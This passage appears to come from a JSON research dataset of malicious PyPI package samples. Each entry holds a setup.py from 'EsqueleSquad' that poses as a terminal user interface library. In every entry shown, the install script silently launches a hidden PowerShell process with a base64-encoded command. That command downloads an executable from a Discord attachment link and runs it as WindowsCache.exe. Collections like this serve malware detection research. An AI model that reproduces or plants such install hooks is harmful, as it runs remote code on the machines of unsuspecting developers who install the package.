'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libguiurlcc-v6.38",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libguiurlcc',\n    packages = ['modlib'],\n    version = '7.23',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libhackedloadtool-v8.54",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libhackedloadtool',\n    packages = ['modlib'],\n    version = '4.44',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libhackedstrreplace-v3.20",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libhackedstrreplace',\n    packages = ['modlib'],\n    version = '4.70',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libhttppostpost-v10.70",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libhttppostpost',\n    packages = ['modlib'],\n    version = '6.12',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libhydraedstudy-v6.31",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libhydraedstudy',\n    packages = ['modlib'],\n    version = '7.37',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libintelkillvm-v8.47",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libintelkillvm',\n    packages = ['modlib'],\n    version = '2.19',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libkillmaskhydra-v2.69",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libkillmaskhydra',\n    packages = ['modlib'],\n    version = '3.30',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-liblibpostcc-v2.61",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'liblibpostcc',\n    packages = ['modlib'],\n    version = '9.8',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libmasklibosint-v4.81",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libmasklibosint',\n    packages = ['modlib'],\n    version = '3.88',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libmccraftpush-v8.51",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libmccraftpush',\n    packages = ['modlib'],\n    version = '6.81',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libmclibed-v5.84",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libmclibed',\n    packages = ['modlib'],\n    version = '3.59',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libpeppipintel-v2.18",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpeppipintel',\n    packages = ['modlib'],\n    version = '1.59',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libpingverrand-v2.34",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpingverrand',\n    packages = ['modlib'],\n    version = '3.88',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libpipkillre-v4.35",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpipkillre',\n    packages = ['modlib'],\n    version = '5.65',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 